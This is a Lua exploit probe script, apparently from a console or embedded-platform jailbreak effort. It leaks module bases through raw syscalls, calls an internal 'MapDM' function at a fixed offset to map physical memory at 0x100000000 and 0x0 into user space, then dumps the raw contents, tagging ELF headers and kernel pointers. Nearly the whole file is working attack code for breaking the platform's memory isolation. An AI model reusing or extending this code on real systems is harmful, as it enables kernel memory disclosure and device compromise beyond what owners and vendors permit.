-- CRASH_CLASS: LOW
-- PROBE 562o: Direct main-thread read from MapDM'd physical memory
--
-- CRITICAL HYPOTHESIS:
-- 562n proved that after MapDM, writes to ANY mmap'd page produce trace blocks.
-- fn_addr is suppressed for ALL children (not just MapDM-touching ones).
--
-- But we never tested the SIMPLEST thing: memory.read_qword(mapped_va)
-- from the main thread. MapDM maps physical memory RW. The Lua C function
-- memory.read_qword just dereferences the pointer. No fn_addr, no child,
-- no ROP. If the page is mapped, the read should succeed.
--
-- 562j tested native.fcall_with_rax (fn_addr) not memory.read_qword.
-- These are completely different code paths.

print("=== PROBE 562o: DIRECT MAIN-THREAD PHYS READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local Z = uint64(0)
local sc477 = mk(477)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

-- Get module bases
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))
io.flush()

-- ============================================================
-- [A] MapDM phys 0x100000000 → VA 0x880000000
-- ============================================================
print("[A] MapDM phys 0x100000000")
local mapped_va = uint64("0x880000000")
-- Reserve VA
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
-- Map physical memory
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
print("MapDM rv=" .. (ok_md and N(rv_md) or -999))
io.flush()

-- ============================================================
-- [B] Direct read from mapped_va using memory.read_dword/qword
-- ============================================================
print("")
print("[B] Direct memory.read_dword from phys page:")
io.flush()

for off = 0, 0x38, 4 do
    local val = rb(N(mapped_va) + off)
    if val then
        print(string.format("  phys+0x%02X = 0x%08X", off, val))
    else
        print(string.format("  phys+0x%02X = READ FAILED", off))
    end
end
io.flush()

print("")
print("[C] Direct memory.read_qword from phys page:")
io.flush()

for off = 0, 0x38, 8 do
    local val = rq(N(mapped_va) + off)
    if val then
        local h, l = get_hi_lo(val)
        if l < 0 then l = l + 0x100000000 end
        if h < 0 then h = h + 0x100000000 end
        local tag = ""
        if l == 0x464C457F then tag = " *** ELF MAGIC! ***" end
        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then tag = tag .. " KPTR?" end
        print(string.format("  phys+0x%02X = 0x%08X_%08X%s", off, h, l, tag))
    else
        print(string.format("  phys+0x%02X = READ FAILED", off))
    end
end
io.flush()

-- ============================================================
-- [D] Also try a few other physical addresses
-- ============================================================
print("")
print("[D] Trying phys 0x0 (BIOS/reset vector area)")
io.flush()

local mapped_va2 = uint64("0x890000000")
pcall(function()
    sc477(mapped_va2, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md2, rv_md2 = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va2, uint64(0x4000), uint64(3), Z,
        Z, uint64(0x4000))
end)
print("MapDM(0x0) rv=" .. (ok_md2 and N(rv_md2) or -999))

if ok_md2 and N(rv_md2) == 0 then
    for off = 0, 0x38, 8 do
        local val = rq(N(mapped_va2) + off)
        if val then
            local h, l = get_hi_lo(val)
            if l < 0 then l = l + 0x100000000 end
            if h < 0 then h = h + 0x100000000 end
            print(string.format("  phys_0+0x%02X = 0x%08X_%08X", off, h, l))
        else
            print(string.format("  phys_0+0x%02X = READ FAILED", off))
        end
    end
end
io.flush()

-- ============================================================
-- [E] Sanity: main thread still alive?
-- ============================================================
print("")
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562o DONE ===")
